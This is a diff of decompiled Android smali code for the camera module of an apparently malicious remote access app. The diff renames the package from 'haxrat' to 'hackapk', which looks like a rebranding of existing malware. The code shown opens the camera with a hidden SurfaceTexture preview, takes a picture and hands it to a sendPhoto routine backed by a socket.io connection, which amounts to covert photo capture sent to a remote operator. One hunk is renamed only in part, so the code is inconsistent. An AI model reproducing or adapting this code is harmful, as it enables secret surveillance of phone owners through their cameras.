@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/CameraManager;
+.class public Lcom/justhack/hackapk/CameraManager;
 .super Ljava/lang/Object;
 .source "CameraManager.java"
 
@@ -6,7 +6,7 @@
 # annotations
 .annotation system Ldalvik/annotation/MemberClasses;
     value = {
-        Lcom/hax4us/haxrat/CameraManager$100000000;
+        Lcom/justhack/hackapk/CameraManager$100000000;
     }
 .end annotation
 
@@ -36,12 +36,12 @@
 
     move-object v4, v1
 
-    iput-object v4, v3, Lcom/hax4us/haxrat/CameraManager;->context:Landroid/content/Context;
+    iput-object v4, v3, Lcom/justhack/hackapk/CameraManager;->context:Landroid/content/Context;
 
     return-void
 .end method
 
-.method static synthetic access$1000003(Lcom/hax4us/haxrat/CameraManager;[B)V
+.method static synthetic access$1000003(Lcom/justhack/hackapk/CameraManager;[B)V
     .locals 6
 
     move-object v0, p0
@@ -52,19 +52,19 @@
 
     move-object v5, v1
 
-    invoke-direct {v4, v5}, Lcom/hax4us/haxrat/CameraManager;->sendPhoto([B)V
+    invoke-direct {v4, v5}, Lcom/justhack/hackapk/CameraManager;->sendPhoto([B)V
 
     return-void
 .end method
 
-.method static synthetic access$1000004(Lcom/hax4us/haxrat/CameraManager;)V
+.method static synthetic access$1000004(Lcom/justhack/hackapk/CameraManager;)V
     .locals 4
 
     move-object v0, p0
 
     move-object v3, v0
 
-    invoke-direct {v3}, Lcom/hax4us/haxrat/CameraManager;->releaseCamera()V
+    invoke-direct {v3}, Lcom/justhack/hackapk/CameraManager;->releaseCamera()V
 
     return-void
 .end method
@@ -83,21 +83,21 @@
 
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v2, v2, Lcom/justhack/hackapk/CameraManager;->camera:Landroid/hardware/Camera;
 
     if-eqz v2, :cond_0
 
     .line 73
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v2, v2, Lcom/justhack/hackapk/CameraManager;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v2}, Landroid/hardware/Camera;->stopPreview()V
 
     .line 74
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v2, v2, Lcom/justhack/hackapk/CameraManager;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v2}, Landroid/hardware/Camera;->release()V
 
@@ -108,7 +108,7 @@
 
     check-cast v3, Landroid/hardware/Camera;
 
-    iput-object v3, v2, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;
+    iput-object v3, v2, Lcom/justhack/hackapk/CameraManager;->camera:Landroid/hardware/Camera;
 
     :cond_0
     return-void
@@ -209,11 +209,11 @@
     move-result-object v7
 
     .line 62
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
 
     move-result-object v7
 
-    invoke-virtual {v7}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v7}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v7
 
@@ -270,7 +270,7 @@
 
     move-object v9, v0
 
-    iget-object v9, v9, Lcom/hax4us/haxrat/CameraManager;->context:Landroid/content/Context;
+    iget-object v9, v9, Lcom/justhack/hackapk/CameraManager;->context:Landroid/content/Context;
 
     invoke-virtual {v9}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
 
@@ -599,12 +599,12 @@
 
     move-result-object v7
 
-    iput-object v7, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;
+    iput-object v7, v6, Lcom/justhack/hackapk/CameraManager;->camera:Landroid/hardware/Camera;
 
     .line 33
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v6, v6, Lcom/justhack/hackapk/CameraManager;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v6}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;
 
@@ -615,7 +615,7 @@
     .line 34
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v6, v6, Lcom/justhack/hackapk/CameraManager;->camera:Landroid/hardware/Camera;
 
     move-object v7, v3
 
@@ -625,7 +625,7 @@
     move-object v6, v0
 
     :try_start_0
-    iget-object v6, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v6, v6, Lcom/justhack/hackapk/CameraManager;->camera:Landroid/hardware/Camera;
 
     new-instance v7, Landroid/graphics/SurfaceTexture;
 
@@ -644,7 +644,7 @@
     .line 37
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v6, v6, Lcom/justhack/hackapk/CameraManager;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v6}, Landroid/hardware/Camera;->startPreview()V
     :try_end_0
@@ -654,7 +654,7 @@
     :goto_0
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v6, v6, Lcom/justhack/hackapk/CameraManager;->camera:Landroid/hardware/Camera;
 
     const/4 v7, 0x0
 
@@ -664,7 +664,7 @@
 
     check-cast v8, Landroid/hardware/Camera$PictureCallback;
 
-    new-instance v9, Lcom/hax4us/haxrat/CameraManager$100000000;
+    new-instance v9, Lcom/justhack/hackapk/CameraManager$100000000;
 
     move-object v12, v9
 
@@ -674,7 +674,7 @@
 
     move-object v11, v0
 
-    invoke-direct {v10, v11}, Lcom/hax4us/haxrat/CameraManager$100000000;-><init>(Lcom/hax4us/haxrat/CameraManager;)V
+    invoke-direct {v10, v11}, Lcom/justhack/hackapk/CameraManager$100000000;-><init>(Lcom/justhack/hackapk/CameraManager;)V
 
     invoke-virtual {v6, v7, v8, v9}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V
 
